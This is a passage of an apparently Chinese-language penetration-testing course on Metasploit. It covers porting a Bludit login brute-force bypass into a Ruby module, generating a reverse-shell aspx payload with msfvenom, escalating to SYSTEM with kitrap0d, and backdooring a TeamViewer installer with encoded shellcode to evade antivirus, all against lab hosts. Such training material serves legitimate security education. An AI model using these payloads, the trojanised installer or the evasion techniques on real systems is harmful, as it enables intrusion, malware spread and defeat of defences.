```shell-session
msf6> loadpath /usr/share/metasploit-framework/modules/
```

或者，我们也可以启动`msfconsole`并运行`reload_all`新安装的模块出现在列表中的命令。命令运行完没有报错后，要么试试`search [name]`里面的函数`msfconsole`，要么直接用`use [module-path]`直接跳转到新安装的模块。

 MSF - 加载附加模块

```shell-session
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection 
msf6 exploit(unix/webapp/nagios3_command_injection) > show options

Module options (exploit/unix/webapp/nagios3_command_injection):

   Name     Current Setting                 Required  Description
   ----     ---------------                 --------  -----------
   PASS     guest                           yes       The password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80                              yes       The target port (TCP)
   SSL      false                           no        Negotiate SSL/TLS for outgoing connections
   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi
   USER     guest                           yes       The username to authenticate with
   VHOST                                    no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

现在我们已准备好针对我们的目标启动它。

------

## 将脚本移植到 Metasploit 模块中

要将自定义 Python、PHP 或任何类型的漏洞利用脚本改编为 Metasploit 的 Ruby 模块，我们需要学习 Ruby 编程语言。请注意，Metasploit 的 Ruby 模块始终使用硬选项卡编写。

当开始移植项目时，我们不需要从头开始编码。相反，我们可以从我们的项目所属的类别中获取现有的漏洞利用模块之一，并将其重新用于我们当前的移植脚本。请记住始终保持我们的自定义模块井井有条，以便我们和其他渗透测试人员在搜索自定义模块时可以从干净、井井有条的环境中受益。

我们首先选择一些漏洞利用代码移植到 Metasploit。在此示例中，我们将使用[Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass](https://www.exploit-db.com/exploits/48746)。我们需要下载脚本，`48746.rb`然后将其复制到`/usr/share/metasploit-framework/modules/exploits/linux/http/`文件夹中。如果我们现在启动`msfconsole`，我们将只能在与上面相同的文件夹中找到一个`Bludit CMS`漏洞，确认我们的漏洞还没有被移植过来。好消息是该文件夹中已经有一个 Bludit 漏洞，因为我们将把它用作我们新漏洞的样板代码。

#### 移植 MSF 模块

 移植 MSF 模块

```shell-session
vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit

bludit_upload_images_exec.rb
```

 移植 MSF 模块

```shell-session
vnswer77@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```

在我们复制的文件的开头，也就是我们要填写信息的地方，我们可以注意到`include`样板模块开头的语句。这些是本节中提到的混合宏`Plugins and Mixins`，我们需要将它们更改为适合我们模块的混合宏。

[如果我们想找到我们的模块工作所需的合适的 mixins、类和方法，我们将需要在rubydoc rapid7 文档](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf)中查找不同的条目。

------

## 编写我们的模块

在特定评估期间，我们经常会面对运行专有代码以服务其客户的定制网络。我们手头的大多数模块甚至都没有在它们的周边留下凹痕，而且我们似乎无法用我们拥有的任何东西正确地扫描和记录目标。在这里，我们可能会发现重拾 Ruby 技能并开始编写模块代码很有帮助。

[有关 Metasploit Ruby 编码的所有必要信息都可以在Rubydoc.info Metasploit Framework](https://www.rubydoc.info/github/rapid7/metasploit-framework)相关页面上找到。从扫描器到其他辅助工具，从定制的漏洞利用程序到移植的漏洞利用程序，用 Ruby 为框架编写代码是一项非常实用的技能。

请看下面一个类似的模块，我们可以将其用作漏洞利用移植的样板代码。这是[Bludit 目录遍历图像文件上传漏洞](https://www.exploit-db.com/exploits/47699)利用，已经导入到`msfconsole`. 在漏洞利用概念验证 ( ) 之前，花点时间了解模块中包含的所有不同字段`POC`。请注意，此代码在下面的代码片段中没有更改以适应我们当前的导入，而是上面提到的预先存在的模块的直接快照。这些信息将需要针对新的移植项目进行相应调整。

#### 概念验证 - 要求

代号：红宝石

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report
```

我们可以查看`include`语句以了解每个语句的作用。[这可以通过将它们与rubydoc rapid7 文档](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf)交叉引用来完成。以下是文档中解释的它们各自的功能：

| **功能**                           | **描述**                                                 |
| ---------------------------------- | -------------------------------------------------------- |
| `Msf::Exploit::Remote::HttpClient` | 该模块提供了在利用 HTTP 服务器时充当 HTTP 客户端的方法。 |
| `Msf::Exploit::PhpEXE`             | 这是一种用于生成第一阶段 php 负载的方法。                |
| `Msf::Exploit::FileDropper`        | 此方法在与目标建立会话后传输文件并处理文件清理。         |
| `Msf::Auxiliary::Report`           | 此模块提供向 MSF DB 报告数据的方法。                     |

看看他们上面的目的，我们得出结论，我们不需要 FileDropper 方法，我们可以从最终的模块代码中删除它。

我们看到有不同的部分专门用于`info`模块的页面，`options`部分。我们不恰当地填写它们，向发现漏洞的个人、CVE 信息和其他相关详细信息提供信用。

#### 概念验证 - 模块信息

代号：红宝石

```ruby
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
        parameter in the image upload feature in order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to finally get remote code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'christasa', # Original discovery
          'sinn3r'     # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-16113'],
          ['URL', 'https://github.com/bludit/bludit/issues/1081'],
          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-09-07",
      'DefaultTarget'  => 0))
```

一般标识信息填好后，我们就可以转到`options`菜单变量了：

#### 概念验证 - 功能

代号：红宝石

```ruby
 register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
      ])
  end
```

回顾我们的利用，我们发现需要一个单词表而不是`BLUDITPASS`模块的变量来暴力破解相同用户名的密码。它看起来像下面的片段：

代号：红宝石

```ruby
OptPath.new('PASSWORDS', [ true, 'The list of passwords',
          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
```

其余的漏洞利用代码需要根据移植到 Metasploit Framework 中使用的类、方法和变量进行调整，以使模块最终发挥作用。该模块的最终版本如下所示：

#### 概念验证

代号：红宝石

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))
      
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
        	File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
  end
  
  # -- Exploit code -- #
  # dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
class WebAgent
  class Cookie < HTTP::Cookie
    def domain
      self.original_domain
    end
  end
end

def get_csrf(client, login_url)
  res = client.get(login_url)
  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
end

def auth_ok?(res)
  HTTP::Status.redirect?(res.code) &&
    %r{/admin/dashboard}.match?(res.headers['Location'])
end

def bruteforce_auth(client, host, username, wordlist)
  login_url = host + '/admin/login'
  File.foreach(wordlist).with_index do |password, i|
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      'X-Forwarded-For' => "#{i}-#{password[..4]}",
    }
    data = {
      'tokenCSRF' => csrf_token,
      'username' => username,
      'password' => password,
    }
    puts "[*] Trying password: #{password}"
    auth_res = client.post(login_url, data, headers)
    if auth_ok?(auth_res)
      puts "\n[+] Password found: #{password}"
      break
    end
  end
end

#begin
#  args = Docopt.docopt(doc)
#  pp args if args['--debug']
#
#  clnt = HTTPClient.new
#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
#rescue Docopt::Exit => e
#  puts e.message
#end
```

如果您想了解有关将脚本移植到 Metasploit 框架中的更多信息，请查看[No Starch Press 的 Metasploit：渗透测试人员指南](https://nostarch.com/metasploit)。Rapid7 还创建了关于此主题的博客文章，可[在此处](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/)找到。

# MSF毒液简介

------

`MSFVenom``MSFPayload`是和的后继者`MSFEncode`，这两个独立脚本过去常常与 结合使用，`msfconsole`为用户提供高度可定制且难以检测的有效负载以进行攻击。

```
MSFVenom`是这两种工具结合的结果。在使用此工具之前，我们必须将用于为特定处理器架构和操作系统版本生成 shellcode 的`|`结果通过管道 ()传输到，其中包含多种编码方案，用于从 shellcode 中删除不良字符。这有时会导致运行时不稳定 - 以及用于规避旧版防病毒 ( ) 和端点入侵防御/入侵检测 ( ) 软件。`MSFPayload``MSFEncode``AV``IPS/IDS
```

如今，这两个组合工具为渗透测试人员提供了一种方法，可以为不同的目标主机架构和版本快速制作有效载荷，同时有可能“清理”他们的 shellcode，以便在部署时不会遇到任何错误。如今，AV 规避部分要复杂得多，因为仅基于签名的恶意文件分析已成为过去。`Heuristic analysis, machine learning, and deep packet inspection`使有效负载更难通过编码方案的几个后续迭代来逃避任何好的 AV 软件。如模块中所示`Payloads`，提交具有上述相同配置的简单有效载荷产生的命中率为`52/65`. 就全球恶意软件分析师而言，这就是宾果游戏。（全世界的恶意软件分析师是否真的说“那是宾果游戏”，这一点仍未得到证实。）

------

## 创建我们的有效载荷

假设我们发现了一个开放的 FTP 端口，该端口要么凭据薄弱，要么意外地对匿名登录开放。现在，假设 FTP 服务器本身链接到在`tcp/80`同一台机器的端口上运行的 Web 服务，并且可以在 Web 服务的目录中查看 FTP 根目录中找到的所有文件`/uploads`。我们还假设 Web 服务没有任何检查允许我们作为客户端在其上运行的内容。

假设我们被允许从 Web 服务中调用任何我们想要的东西。在这种情况下，我们可以直接通过 FTP 服务器上传 PHP shell 并从 Web 访问它，触发有效载荷并允许我们从受害机器接收反向 TCP 连接。

#### 扫描目标

 扫描目标

```shell-session
vnswer77@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5

<SNIP>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### FTP 匿名访问

 FTP 匿名访问

```shell-session
vnswer77@htb[/htb]$ ftp 10.10.10.5

Connected to 10.10.10.5.
220 Microsoft FTP Service


Name (10.10.10.5:root): anonymous

331 Anonymous access allowed, send identity (e-mail name) as password.


Password: ******

230 User logged in.
Remote system type is Windows_NT.


ftp> ls

200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

注意 aspnet_client，我们意识到该框将能够运行`.aspx`反向 shell。对我们来说幸运的是，`msfvenom`可以毫无问题地做到这一点。

#### 生成有效载荷

 生成有效载荷

```shell-session
vnswer77@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

 生成有效载荷

```shell-session
vnswer77@htb[/htb]$ ls

Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
```

现在，我们只需要导航到`http://10.10.10.5/reverse_shell.aspx`，它就会触发`.aspx`负载。然而，在我们这样做之前，我们应该在 msfconsole 上启动一个侦听器，以便在其中捕获反向连接请求。

#### MSF - 设置 Multi/Handler

 MSF - 设置 Multi/Handler

```shell-session
vnswer77@htb[/htb]$ msfconsole -q 

msf6 > use multi/handler
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.14.5

LHOST => 10.10.14.5


msf6 exploit(multi/handler) > set LPORT 1337

LPORT => 1337


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337 
```

------

## 执行负载

现在我们可以触发`.aspx`Web 服务上的负载。这样做不会在页面上加载任何视觉上的内容，但回顾我们的`multi/handler`模块，我们会收到一个连接。我们应该确保我们的`.aspx`文件不包含 HTML，因此我们只会看到一个空白网页。然而，有效负载无论如何都是在后台执行的。

#### MSF - Meterpreter 外壳

 MSF - Meterpreter 外壳

```shell-session
<...SNIP...>
[*] Started reverse TCP handler on 10.10.14.5:1337 

[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000


meterpreter > getuid

Server username: IIS APPPOOL\Web


meterpreter > 

[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
```

如果 Meterpreter 会话死得太频繁，我们可以考虑对其进行编码以避免在运行时出错。我们可以选择任何可行的编码器，无论如何它最终都会提高我们成功的机会。

------

## 本地漏洞利用建议

作为提示，有一个名为`Local Exploit Suggester`. 我们将在这个例子中使用这个模块，因为 Meterpreter shell 登陆用户`IIS APPPOOL\Web`，自然没有很多权限。此外，运行该`sysinfo`命令向我们展示了系统是 x86 位架构，让我们更有理由相信 Local Exploit Suggester。

#### MSF - 搜索本地漏洞利用建议者

 MSF - 搜索本地漏洞利用建议者

```shell-session
msf6 > search local exploit suggester

<...SNIP...>
   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure

<SNIP>

msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set session 2

session => 2


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

将这些结果摆在我们面前，我们可以轻松地选择其中一个进行测试。如果我们选择的一个最终无效，请继续进行下一个。并非所有检查都是 100% 准确的，并非所有变量都相同。往下看，`bypassauc_eventvwr`失败是因为 IIS 用户不是管理员组的一部分，这是默认和预期的。第二个选项`ms10_015_kitrap0d`可以解决问题。

#### MSF - 本地权限提升

 MSF - 本地权限提升

```shell-session
msf6 exploit(multi/handler) > search kitrap0d

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D


msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     1338             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338

LPORT => 1338


msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3

SESSION => 3


msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.5:1338 
[*] Launching notepad to host the exploit...
[+] Process 3552 launched.
[*] Reflectively injecting the exploit DLL into 3552...
[*] Injecting exploit into 3552 ...
[*] Exploit injected. Injecting payload into 3552...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

# 防火墙和 IDS/IPS 规避

------

为了更好地了解我们如何高效、安静地攻击目标，我们首先需要更好地了解该目标是如何防御的。我们介绍了两个新术语：

- 端点保护
- 周界保护

------

## 端点保护

`Endpoint protection`指任何本地化设备或服务，其唯一目的是保护网络上的单个主机。主机可以是个人计算机、公司工作站或网络非军事区 (De-Militarized Zone `DMZ`) 中的服务器。

端点保护通常以软件包的形式出现，其中包括`Antivirus Protection`, `Antimalware Protection`（这包括英国媒体报道软件、间谍软件、广告软件、恐吓软件、勒索软件），`Firewall`以及`Anti-DDOS`所有这些都在同一个软件包中。我们比后者更熟悉这种形式，因为我们大多数人都在家里的 PC 或工作场所的工作站上运行端点保护软件。Avast、Nod32、Malwarebytes 和 BitDefender 只是一些当前名称。

------

#### 周界保护

`Perimeter protection`通常出现在网络外围边缘的物理或虚拟设备中。它们`edge devices`本身提供`inside`从 的网络访问`outside`，换句话说，从`public`到`private`。

在这两个区域之间，在某些情况下，我们还会发现第三个区域，称为非军事区 (De-Militarized Zone `DMZ`)，如前所述。这是一个`lower-security policy level`比一个地带`inside networks'`，但比一个更高的`trust level`地带`outside zone`，这就是浩瀚的互联网。这是面向公众的服务器所在的虚拟空间，它们从 Internet 为公共客户端推送和拉取数据，但也从内部进行管理，并使用补丁、信息和其他数据进行更新，以使所服务的信息保持最新和满足服务器的客户。

------

## 安全政策

安全策略是任何网络维护良好的安全状态背后的驱动力。它们的功能与 ACL（访问控制列表）对熟悉 Cisco CCNA 教育材料的任何人的作用相同。它们本质上是一个列表`allow`和`deny`语句，指示流量或文件如何存在于网络边界内。多个列表可以作用于多个网络部分，允许配置中的灵活性。这些列表还可以针对网络和主机的不同功能，具体取决于它们所在的位置：

- 网络流量策略
- 申请政策
- 用户访问控制策略
- 文件管理政策
- DDoS 保护策略
- 其他的

虽然并非上述所有这些类别都带有“安全策略”一词，但围绕它们的所有安全机制都基于相同的基本原则运行，即和`allow`条目`deny`。唯一的区别是它们引用和应用的对象目标。所以问题仍然存在，我们如何将网络中的事件与这些规则匹配，以便可以采取前面提到的行动？

有多种方法可以将事件或对象与安全策略条目相匹配：

| **安全政策**                                | **描述**                                                     |
| ------------------------------------------- | ------------------------------------------------------------ |
| `Signature-based Detection`                 | 数据包在网络中的操作以及与称为签名的预建和预定攻击模式的比较。与这些签名的任何 100% 匹配都会产生警报。 |
| `Heuristic / Statistical Anomaly Detection` | 与既定基线的行为比较包括已知 APT（高级持续威胁）的作案手法签名。基线将确定网络的规范以及常用的协议。任何与最大阈值的偏差都会产生警报。 |
| `Stateful Protocol Analysis Detection`      | 使用普遍接受的非恶意活动定义的预建配置文件，通过事件比较来识别协议的差异。 |
| `Live-monitoring and Alerting (SOC-based)`  | 专用、内部或租用的 SOC（安全运营中心）中的一组分析师使用实时馈送软件来监控网络活动和中间警报系统以发现任何潜在威胁，自行决定是否应对威胁采取行动或让自动化机制会采取行动。 |

------

## 规避技术

现在大多数基于主机的防病毒软件主要依赖于`Signature-based Detection`识别软件样本中存在的恶意代码的各个方面。这些签名放置在防病毒引擎内，随后用于扫描存储空间和正在运行的进程以查找任何匹配项。当一个未知软件登陆分区并被防病毒软件匹配时，大多数防病毒软件会隔离恶意程序并杀死正在运行的进程。

我们如何避开所有这些热量？我们和它一起玩。本节中显示的示例`Encoders`表明，对于所有 AV 产品，仅使用不同的编码方案和多次迭代对有效载荷进行编码是不够的。此外，仅在攻击者和受害者之间建立一个通信通道就可以用现有的 IDS/IPS 产品的当前功能发出一些警报。

然而，随着 MSF6 版本的发布，msfconsole 可以将 AES 加密的通信从任何 Meterpreter shell 隧道传输回攻击者主机，从而在有效负载发送到受害主机时成功加密流量。这主要用于处理基于网络的 IDS/IPS。在极少数情况下，我们可能会遇到非常严格的流量规则集，这些规则集会根据发件人的 IP 地址标记我们的连接。避免这种情况的唯一方法是找到允许通过的服务。一个很好的例子就是 2017 年的 Equifax 黑客攻击，恶意黑客滥用 Apache Struts 漏洞访问关键数据服务器网络。DNS 渗漏技术用于缓慢地将数据从网络中吸出并进入黑客的域，几个月都不会被注意到。要了解有关此攻击的更多信息，请访问以下链接：

- [美国政府关于 Equifax 黑客攻击的事后分析报告](https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/)
- [防止 DNS 渗漏](https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411)
- [阻止数据泄露和恶意软件通过 DNS 传播](https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf)

回到 msfconsole，它现在支持 AES 加密隧道的能力，加上 Meterpreter 在内存中运行的特性，大大提高了我们的能力。然而，我们仍然有一个问题，即有效载荷一旦到达目的地，在运行并放入内存之前会发生什么。可以对该文件的签名进行指纹识别，与数据库进行匹配，并阻止我们访问目标的机会。我们还可以确定，AV 软件开发人员正在研究 msfconsole 模块和功能，以将生成的代码和文件添加到他们的签名数据库中，从而导致大多数（如果不是全部）默认有效负载立即被 AV 软件关闭。

我们很幸运，因为`msfvenom`提供了使用可执行模板的选项。这允许我们为可执行文件使用一些预设模板，将我们的有效载荷注入其中（没有双关语意），并使用`any`可执行文件作为我们可以发起攻击的平台。我们可以将 shellcode 嵌入到我们手边的任何安装程序、软件包或程序中，将有效负载 shellcode 隐藏在实际产品的合法代码深处。这极大地混淆了我们的恶意代码，更重要的是，降低了我们被检测到的机会。实际的、合法的可执行文件、我们不同的编码方案（及其迭代）和我们不同的有效负载 shellcode 变体之间有许多有效组合。这会生成所谓的后门可执行文件。

查看下面的代码片段，了解 msfvenom 如何将有效载荷嵌入到任何可执行文件中：

 周界保护

```shell-session
vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
```

 周界保护

```shell-session
vnswer77@htb[/htb]$ ls

Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
```

大多数情况下，当目标启动后门可执行文件时，似乎什么也不会发生，这在某些情况下会引起怀疑。为了提高我们的机会，我们需要触发已启动应用程序的正常执行的继续，同时将有效负载从主应用程序拉到一个单独的线程中。我们使用`-k`上面显示的标志来执行此操作。然而，即使`-k`标志正在运行，如果目标从 CLI 环境启动后门可执行模板，他们只会注意到正在运行的后门。如果他们这样做，将弹出一个单独的窗口，其中包含有效载荷，直到我们在目标上完成运行有效载荷会话交互后，该窗口才会关闭。

------

## 档案

存档文件、文件夹、脚本、可执行文件、图片或文档等信息并在存档上放置密码可绕过当今许多常见的反病毒签名。但是，此过程的缺点是它们将作为通知在 AV 警报仪表板中提出，因为由于被密码锁定而无法扫描。管理员可以选择手动检查这些档案以确定它们是否是恶意的。

#### 生成有效载荷

 生成有效载荷

```shell-session
vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
```

 生成有效载荷

```shell-session
vnswer77@htb[/htb]$ cat test.js

�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

如果我们检查 VirusTotal 以从我们生成的有效负载中获取检测基线，结果将如下所示。

#### 病毒总数

 病毒总数

```shell-session
vnswer77@htb[/htb]$ msf-virustotal -k <API key> -f test.js 

[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
[*] communicate, publish, publicly perform, publicly display and distribute such
[*] content. To read the complete Terms of Service for VirusTotal, please go to the
[*] following link:
[*] https://www.virustotal.com/en/about/terms-of-service/
[*] 
[*] If you prefer your own API key, you may obtain one at VirusTotal.

[*] Enter 'Y' to acknowledge: Y


[*] Using API key: <API key>
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167047
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Analysis Report: test.js (11 / 59): <...SNIP...>
====================================================================================================

 Antivirus             Detected  Version               Result                             Update
 ---------             --------  -------               ------                             ------
